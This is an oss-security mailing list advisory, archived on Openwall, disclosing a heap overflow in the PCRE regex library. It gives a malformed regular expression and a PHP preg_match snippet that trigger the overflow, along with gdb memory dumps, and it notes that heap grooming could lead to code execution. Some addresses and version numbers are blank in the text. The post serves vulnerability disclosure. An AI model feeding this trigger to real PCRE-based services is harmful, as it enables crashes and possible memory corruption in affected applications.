  oss-security - PCRE Library Heap Overflow Vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 1 Jun From: "wen_guanxing" <wen_guanxing@...ustech.com.cn> To: "oss-security" <oss-security@...ts.openwall.com> Subject: PCRE Library Heap Overflow Vulnerability  PCRE Library Heap Overflow Vulnerability ------------------------------------------------------------------ I. Summary PCRE is a regular expression C library inspired by the regular expression capabilities in the Perl programming language. The PCRE library is incorporated into a number of prominent programs, such as Adobe Flash, Apache, Nginx, PHP. PCRE library is prone to a vulnerability which leads to Heap Overflow. During the compilation of a malformed regular expression, more data is written on the malloced block than the expected size output by compile_regex. Exploits with advanced Heap Fengshui techniques may allow an attacker to execute arbitrary code in the context of the user running the affected application. ------------------------------------------------------------------ II. Description Latest version of PCRE is prone to a Heap Overflow vulnerability which could caused by the following regular expression. /^(?P=B)((?P=B)(?J:(?P<B>c)(?P<B>a(?P=B)))>WGXCREDITS)/ To reproduce the problem, we could use pcretest provide by PCRE library or applications which is wrapped with PCRE such as PHP. For pcretest, simply type the regular expression after the re> For PHP, latest version of PHP (wrapped with PCRE could be triggered by following code snippet: <?php preg_match("/^(?P=B)((?P=B)(?J:(?P<B>c)(?P<B>a(?P=B)))>WGXCREDITS)/","ADLAB",$arr); ?> First, pcre_compile2 invoke compile_regex() to calucate the size of memory that is used to save the regular expression. re then points to the new allocated memory with the size above. Next, pcre_compile2 invoke compile_regex() again to fill the regular expression into the allocated memory. The problem here is that more data is written then expected. Following test is conveyed under Kali Linux (based on Debian x64) with php ============================================================== gdb php poc.php    re = (REAL_PCRE *)(PUBL(malloc))(size); (gdb) x/10i $rip =>   mov    rdi,rbp      call   QWORD PTR [rax] (gdb) x $rbp           Cannot access memory at address ============================================================== So the expected size of the above regular expression is = And the base address of allocated memory is Here is the layout of just before the second compile_regexp: ============================================================== (gdb)                                                         0xff    0xff    0xff    0xff    0xff    0xff    0xff    0xff                                                                                    0xd0    0x7a                                                                                                                                                                                          0xd8    0xf6    0xff    0x7f            0xff    0xff    0xff    0xff                                                                                                0xff    0xff    0xff    0xff    0xff    0xff    0xff]   0xff      0xa1                      ============================================================== After the second compile_regexp: ============================================================== (gdb)                                                         0xff    0xff    0xff    0xff    0xff    0xff    0xff    0xff                                                                                    0xd0    0x7a                                                                                     0x1b                                                                               0x1d                                 0x0c            0x1d                              0x0c                        0x1d    0x3e    0x1d       0x1d       0x1d         0x1d       0x1d       0x1d       0x1d         0x1d       0x1d       0x1d                              ============================================================== Obviously, 5 more bytes is written on the heap in this case. This overflow can be used to modify adjacent length field of array/vector/string, gaining the attacker the ability to read/write the whole memory  in the context of the affected application (The same trick as ------------------------------------------------------------------ III. Impact Heap Overflow ------------------------------------------------------------------ IV. Affected PCRE version > are confirmed to be vulnerable). PCRE2 is also confirmed to be vulnerable.  Other applications may also be affected. ------------------------------------------------------------------ V. Credit Wen Guanxing from Venustech ADLAB is credited for this vulnerability. Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      